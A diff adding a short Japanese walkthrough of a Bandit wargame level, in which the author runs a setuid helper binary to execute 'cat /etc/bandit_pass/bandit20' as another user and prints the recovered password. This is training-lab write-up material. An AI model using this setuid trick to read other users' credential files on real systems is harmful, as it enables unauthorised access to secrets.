@@ -1,0 +1,22 @@
+sshすると、bandit20-doというファイルがある
+
+ls -lしてみると、どうやらsetuidが立っている
+
+fileコマンドで調べると実行ファイルなので、実行してみると
+
+bandit19@melinda:~$ ./bandit20-do
+Run a command as another user.
+  Example: ./bandit20-do id
+
+こんな風に言われたので、./bandit20-do id と打ってみる
+
+uid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11020(bandit20),11019(bandit19)
+
+すると、uidやらeuidが手に入る
+
+結局これで何すんの・・？と思ったのだが、bandit20-doというファイル名から、引数に任意のコマンド渡してやればいけんじゃねと思いやってみる
+
+bandit19@melinda:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
+GbKksEFF4yrVs6il55v6gwY5aVje5f0j
+
+いけた
